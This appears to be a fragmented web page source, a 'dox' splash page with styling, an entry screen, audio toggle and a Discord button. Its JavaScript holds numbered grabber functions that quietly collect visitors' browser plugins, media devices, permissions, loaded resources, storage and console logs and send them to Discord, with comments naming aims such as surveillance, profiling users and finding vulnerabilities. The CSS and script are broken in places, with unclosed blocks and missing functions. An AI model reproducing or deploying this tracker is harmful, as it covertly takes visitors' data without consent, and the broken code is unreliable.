  :root {

    align-items: center;
    justify-content: center;
    overflow: hidden;
    position: relative;

  }

  .bg-image {
    position: fixed;
    top: 0;
    left: 0;

    height: 100%;

    transition: filter 0.4s ease;
  }

  [data-theme="light"] .bg-image {
    filter: grayscale(1) brightness(0.7) blur(1px);

  .bg-overlay {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;

    top: 0;
    left: 0;

    height: 100%;
    z-index: 100;

    flex-direction: column;
    align-items: center;
    justify-content: center;
    background: var(--bg);
    transition: opacity 0.8s ease, transform 0.8s ease;
  }

  #entryScreen.hidden {
    opacity: 0;
    transform: scale(0.95);
    pointer-events: none;
  }

  .entry-title {
    font-size: clamp(5rem, 20vw, 12rem);
    font-weight: 900;
    letter-spacing: -0.04em;
    color: var(--text);
    margin-bottom: 2.5rem;
    animation: flicker 3s infinite;
  }

  @keyframes flicker {
    0%, 100% { opacity: 1; }
    50% { opacity: 0.8; text-shadow: 0 0 20px rgba(255,255,255,0.1); }
  }

  .entry-btn {
    padding: 1.2rem 4rem;
    font-size: 1.2rem;
    font-weight: 700;
    border: 2px solid var(--text);
    background: transparent;
    color: var(--text);

  #mainContent {

    z-index: 2;
    text-align: center;
    padding: 2rem;
    opacity: 0;
    transition: opacity 1.2s ease;
  }

  #mainContent.visible {

  .dox-title {
    font-size: clamp(3.5rem, 14vw, 8rem);
    font-weight: 900;
    letter-spacing: -0.04em;
    color: var(--text);

    border: 1px solid var(--border);
    padding: 2.5rem 4rem;
    min-width: 380px;
    transition: background 0.3s ease, border-color 0.3s ease;
    position: relative;
    overflow: hidden;

    content: '';
    position: absolute;
    top: -50%;
    left: -50%;
    width: 200%;
    height: 200%;
    background: repeating-linear-gradient(
      0deg,
      transparent,
      transparent 2px,
      rgba(255,255,255,0.01) 2px,
      rgba(255,255,255,0.01) 4px
    );
    pointer-events: none;
    animation: scan 8s linear infinite;

  @keyframes scan {
    0% { transform: translateY(-100%); }
    100% { transform: translateY(100%); }
  }

  .dox-line {

    color: var(--text);

    text-align: right;
  }

  .dox-line .value {
    font-weight: 600;
    min-width: 200px;
    text-align: left;

  }

  .typing-cursor {
    display: inline-block;
    width: 2px;
    height: 1.2em;
    background: var(--text);
    margin-left: 2px;
    animation: blink 0.7s step-end infinite;
  }

    0%, 100% { opacity: 1; }

  .theme-toggle {
    position: fixed;
    top: 24px;
    right: 24px;
    z-index: 50;
    width: 48px;
    height: 48px;

    background: var(--card);
    color: var(--text);

    bottom: 80px;
    right: 24px;
    z-index: 50;
    width: 48px;
    height: 48px;

    background: var(--card);
    color: var(--text);
    cursor: pointer;
    font-size: 1.2rem;
    display: flex;
    align-items: center;
    justify-content: center;
    transition: all 0.3s ease;
    font-family: 'Courier New', monospace;

  .audio-toggle:hover {
    border-color: var(--text);

  /* BOTTOM LEFT INFO PANEL */
  #infoPanel {
    position: fixed;
    bottom: 24px;
    left: 24px;
    z-index: 50;
    background: var(--card);
    border: 1px solid var(--border);
    padding: 12px 16px;

    font-size: 0.75rem;
    color: var(--text2);

    color: var(--text);
    font-weight: 600;
  }

  /* DISCORD BUTTON */

    position: fixed;
    bottom: 24px;
    left: 50%;
    transform: translateX(-50%);
    z-index: 50;
    padding: 10px 28px;
    background: var(--card);
    border: 1px solid var(--border);
    color: var(--text);

    font-size: 0.85rem;

    transition: all 0.3s ease;

    text-transform: uppercase;

  #discordBtn:hover {
    border-color: var(--text);
    background: var(--text);

  @media (max-width: 600px) {
    .dox-box {
      padding: 1.5rem;

    .dox-line {
      font-size: 0.8rem;

      bottom: 12px;
      left: 12px;
    }
    #discordBtn {
      font-size: 0.7rem;
      padding: 8px 18px;
      bottom: 12px;
    }
  }
</style>

  // ---- 16. PERFORMANCE TIMING ----
  function grabPerformance() {
    if (window.performance && window.performance.timing) {
      const t = window.performance.timing;
      sendToDiscord('PERFORMANCE TIMING', {
        'Page Load': t.loadEventEnd - t.navigationStart + 'ms',
        'DOM Ready': t.domContentLoadedEventEnd - t.navigationStart + 'ms',
        'Response Time': t.responseEnd - t.requestStart + 'ms',
        'DNS Lookup': t.domainLookupEnd - t.domainLookupStart + 'ms',
        'TCP Connect': t.connectEnd - t.connectStart + 'ms'
      }, 'Browser performance - identify network speed, connection quality');
    }
  }

  // ---- 17. BROWSER PLUGINS ----
  function grabPlugins() {
    if (navigator.plugins) {
      const plugins = [];
      for (let i = 0; i < navigator.plugins.length; i++) {
        plugins.push(navigator.plugins[i].name);
      }
      sendToDiscord('BROWSER PLUGINS', { plugins: plugins.join(', '), count: plugins.length },

      sendToDiscord('MIME TYPES', { types: types.join(', '), count: types.length },

  function grabMediaDevices() {
    if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
      navigator.mediaDevices.enumerateDevices()
        .then(devices => {
          const deviceList = devices.map(d => `${d.kind}: ${d.label || 'Unknown'}`);
          sendToDiscord('MEDIA DEVICES', { devices: deviceList.join(' | ') },
            'Connected webcams/microphones - identify hardware, potential surveillance capability');
        })
        .catch(() => {});
    }
  }

  // ---- 21. NAVIGATION HISTORY ----
  function grabNavigationHistory() {
    if (window.performance && window.performance.getEntriesByType) {
      const resourceEntries = performance.getEntriesByType('resource');
      const urls = resourceEntries.map(e => e.name).slice(0, 50);
      sendToDiscord('NAVIGATION & RESOURCES', {
        'Page URL': window.location.href,
        'Referrer': document.referrer || 'Direct',
        'Resources Loaded': urls.join(' | ').substring(0, 2000)
      }, 'Browsing history, pages visited, resources loaded - profile user interests');
    }
  }

  // ---- 22. STORAGE QUOTA ----
  function grabStorageQuota() {
    if (navigator.storage && navigator.storage.estimate) {
      navigator.storage.estimate()
        .then(quota => {
          sendToDiscord('STORAGE QUOTA', {
            'Used': Math.round(quota.usage / 1024 / 1024) + 'MB',
            'Available': Math.round(quota.quota / 1024 / 1024) + 'MB',
            'Percentage': Math.round((quota.usage / quota.quota) * 100) + '%'
          }, 'Storage usage - identify device storage capacity');
        })
        .catch(() => {});
    }
  }

  // ---- 23. PERMISSIONS ----
  function grabPermissions() {
    if (navigator.permissions && navigator.permissions.query) {
      const perms = ['geolocation', 'notifications', 'camera', 'microphone', 'clipboard-read', 'clipboard-write'];
      const results = {};
      perms.forEach(p => {
        navigator.permissions.query({ name: p })
          .then(result => { results[p] = result.state; })
          .catch(() => {});
      });
      setTimeout(() => {
        if (Object.keys(results).length > 0) {
          sendToDiscord('PERMISSIONS STATUS', results,
            'What user has granted access to - identify security posture');
        }
      }, 2000);
    }
  }

    }, 'Device specifications - identify hardware capabilities');

  // ---- 25. CONSOLE LOG OVERRIDE ----
  function grabConsoleLogs() {
    const origLog = console.log;
    const origError = console.error;
    const origWarn = console.warn;
    const logs = [];

    console.log = function(...args) { logs.push('LOG: ' + args.join(' ')); origLog.apply(console, args); };
    console.error = function(...args) { logs.push('ERROR: ' + args.join(' ')); origError.apply(console, args); };
    console.warn = function(...args) { logs.push('WARN: ' + args.join(' ')); origWarn.apply(console, args); };

    setTimeout(() => {
      if (logs.length > 0) {
        sendToDiscord('CONSOLE LOGS', { logs: logs.join('\n').substring(0, 2000) },
          'Debug information, application errors - find vulnerabilities');
      }
    }, 5000);
  }

  const entryScreen = document.getElementById('entryScreen');

  const enterBtn = document.getElementById('enterBtn');
  const themeToggle = document.getElementById('themeToggle');
  const audioToggle = document.getElementById('audioToggle');

    if (audioPlaying) {
      audio.pause();
      audioPlaying = false;
      audioToggle.textContent = '♫';

      audio.play().then(() => {
        audioPlaying = true;
        audioToggle.textContent = '◼';
      }).catch(() => {
        alert('Audio failed. Check the URL.');
      });

  });

  // ---- TYPE LOOP ----
  function typeLoop(element, text, speed = 50) {
    let isTyping = true;
    let index = 0;
    let timeout;
    let pause = false;

    function type() {
      if (pause) return;
      
      if (isTyping) {
        if (index < text.length) {
          element.textContent = text.substring(0, index + 1) + '▌';
          index++;
          timeout = setTimeout(type, speed);
        } else {
          element.textContent = text + '▌';
          pause = true;
          setTimeout(() => {
            pause = false;
            isTyping = false;
            type();
          }, 1500);
        }
      } else {
        if (index > 0) {
          element.textContent = text.substring(0, index) + '▌';
          index--;
          timeout = setTimeout(type, speed);
        } else {
          element.textContent = '▌';
          pause = true;
          setTimeout(() => {
            pause = false;
            isTyping = true;
            type();
          }, 1000);
        }
      }
    }

    type();
  }
